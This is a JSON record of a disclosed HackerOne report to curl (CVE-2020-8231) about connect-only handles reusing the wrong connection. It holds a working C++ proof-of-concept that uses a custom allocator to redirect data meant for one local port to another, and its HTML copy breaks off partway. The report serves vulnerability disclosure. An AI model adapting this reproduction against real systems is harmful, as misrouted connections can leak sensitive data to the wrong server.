{"id":948876,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDg4NzY=","url":"https://hackerone.com/reports/948876","title":"Connect-only connections can use the wrong connection","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-07-31T20:57:36.135Z","submitted_at":"2020-07-31T20:57:36.215Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"m42a","url":"/m42a","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35663,"url":"https://hackerone.com/curl","handle":"curl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"curl","twitter_handle":"","website":"https://curl.se","about":"cURL is a computer software project providing a library and command-line tool for transferring data using various protocols."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8231"],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-05T12:41:13.444Z","bug_reporter_agreed_on_going_public_at":"2020-11-05T12:41:13.382Z","team_member_agreed_on_going_public_at":"2020-11-05T08:31:12.427Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nIf a connect-only easy handle is not read from or written to, its connection can time out and be closed.  If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection.  This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.\n\nThis sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.\n\nAccording to git bisect, this behavior was introduced in commit 755083d.\n\n## Steps To Reproduce:\n\n  1. Compile the source code below\n  1. Listen on ports 1234, 1235, and 1236\n  1. Run the compiled program\n  1. Notice that the data which was supposed to be sent to port 1234 is actually sent to port 1236\n\n## Supporting Material/References:\n```c++\n#include \u003ciostream\u003e\n#include \u003cstdexcept\u003e\n#include \u003cthread\u003e\n#include \u003cchrono\u003e\n#include \u003cunordered_map\u003e\n\n#include \u003cstring.h\u003e\n\n#include \u003ccurl/curl.h\u003e\n\nusing namespace std::literals;\n\nstatic void require(bool b)\n{\n\tif (!b)\n\t\tthrow std::runtime_error(\"Assertion failed\");\n}\n\nstruct alloc\n{\n\talloc *next_alloc;\n\tstd::size_t size;\n};\n\nstd::unordered_map\u003cstd::size_t, alloc *\u003e cached_allocations;\n\nvoid *malloc_(size_t size)\n{\n\tauto \u0026ptr = cached_allocations[size];\n\tif (ptr)\n\t{\n\t\tvoid *ret = (char *)ptr + sizeof(alloc);\n\t\tptr = ptr-\u003enext_alloc;\n\t\treturn ret;\n\t}\n\tauto new_ptr = (alloc *)calloc(1, size + sizeof(alloc));\n\tnew_ptr-\u003enext_alloc = nullptr;\n\tnew_ptr-\u003esize = size;\n\tvoid *ret = ((char *)new_ptr) + sizeof(alloc);\n\treturn ret;\n}\n\nvoid free_(void *ptr)\n{\n\tauto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));\n\tauto \u0026last_alloc = cached_allocations[alloc_ptr-\u003esize];\n\talloc_ptr-\u003enext_alloc = last_alloc;\n\tlast_alloc = alloc_ptr;\n}\n\nvoid *realloc_(void *ptr, size_t size)\n{\n\tauto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));\n\tauto new_alloc_ptr = (alloc *)realloc(alloc_ptr, size + sizeof(alloc));\n\tnew_alloc_ptr-\u003esize = size;\n\treturn (char *)new_alloc_ptr + sizeof(alloc);\n}\n\nchar *strdup_(const char *str)\n{\n\tauto size = strlen(str) + 1;\n\tauto new_str = (char *)malloc(size);\n\treturn strcpy(new_str, str);\n}\n\nvoid *calloc_(size_t nmemb, size_t size)\n{\n\tauto full_size = nmemb*size;\n\treturn malloc_(full_size);\n}\n\n\nint main()\n{\n\tcurl_global_init_mem(CURL_GLOBAL_DEFAULT, \u0026malloc_, \u0026free_, \u0026realloc_, \u0026strdup_, \u0026calloc_);\n\n\tauto multi = curl_multi_init();\n\trequire(multi);\n\n\tauto easy1234 = curl_easy_init();\n\trequire(easy1234);\n\tauto eret = curl_easy_setopt(easy1234, CURLOPT_URL, \"http://127.0.0.1:1234/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tauto mret = curl_multi_add_handle(multi, easy1234);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1234\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, \u0026running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, \u0026remaining))\n\t\t{\n\t\t\trequire(info-\u003emsg == CURLMSG_DONE);\n\t\t\trequire(info-\u003eeasy_handle == easy1234);\n\t\t\trequire(info-\u003edata.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// Allow connection to port 1234 to age out\n\tstd::this_thread::sleep_for(2s);\n\n\tauto easy1235 = curl_easy_init();\n\trequire(easy1235);\n\teret = curl_easy_setopt(easy1235, CURLOPT_URL, \"http://127.0.0.1:1235/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tmret = curl_multi_add_handle(multi, easy1235);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1235, then close connection to port 1234 as it is too old\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, \u0026running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, \u0026remaining))\n\t\t{\n\t\t\trequire(info-\u003emsg == CURLMSG_DONE);\n\t\t\trequire(info-\u003eeasy_handle == easy1235);\n\t\t\trequire(info-\u003edata.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tauto easy1236 = curl_easy_init();\n\trequire(easy1236);\n\teret = curl_easy_setopt(easy1236, CURLOPT_URL, \"http://127.0.0.1:1236/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tmret = curl_multi_add_handle(multi, easy1236);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1236, which re-uses the memory of the previous connection to port 1234\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, \u0026running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, \u0026remaining))\n\t\t{\n\t\t\trequire(info-\u003emsg == CURLMSG_DONE);\n\t\t\trequire(info-\u003eeasy_handle == easy1236);\n\t\t\trequire(info-\u003edata.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tchar c = 'a';\n\tsize_t n;\n\t// Attempts to send data to port 1234, but actually uses the connection to port 1236\n\teret = curl_easy_send(easy1234, \u0026c, 1, \u0026n);\n\trequire(eret == CURLE_OK);\n\n\tmret = curl_multi_remove_handle(multi, easy1236);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_remove_handle(multi, easy1235);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_remove_handle(multi, easy1234);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_cleanup(multi);\n\trequire(mret == CURLM_OK);\n}\n```\n\n## Impact\n\nThis could cause sensitive data intended for one server to be transmitted to a different server.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eIf a connect-only easy handle is not read from or written to, its connection can time out and be closed.  If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection.  This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.\u003c/p\u003e\n\n\u003cp\u003eThis sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.\u003c/p\u003e\n\n\u003cp\u003eAccording to git bisect, this behavior was introduced in commit 755083d.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eCompile the source code below\u003c/li\u003e\n\u003cli\u003eListen on ports 1234, 1235, and 1236\u003c/li\u003e\n\u003cli\u003eRun the compiled program\u003c/li\u003e\n\u003cli\u003eNotice that the data which was supposed to be sent to port 1234 is actually sent to port 1236\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e#include \u0026lt;iostream\u0026gt;\n#include \u0026lt;stdexcept\u0026gt;\n#include \u0026lt;thread\u0026gt;\n#include \u0026lt;chrono\u0026gt;\n#include \u0026lt;unordered_map\u0026gt;\n\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e#include \u0026lt;string.h\u0026gt;\n\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e#include \u0026lt;curl/curl.h\u0026gt;\n\u003c/span\u003e\n\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eliterals\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebool\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eruntime_error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Assertion failed\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003enext_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eunordered_map\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ecached_allocations\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003emalloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecached_allocations\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003enext_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eret\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003enew_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ecalloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"n\"\u003enew_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003enext_alloc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003enullptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003enew_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003enew_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eret\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003efree_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003elast_alloc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecached_allocations\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003enext_alloc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elast_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elast_alloc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003erealloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003enew_alloc_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003erealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"n\"\u003enew_alloc_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003enew_alloc_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003estrdup_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003enew_str\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003emalloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003estrcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enew_str\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003ecalloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003enmemb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003efull_size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enmemb\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003emalloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efull_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan 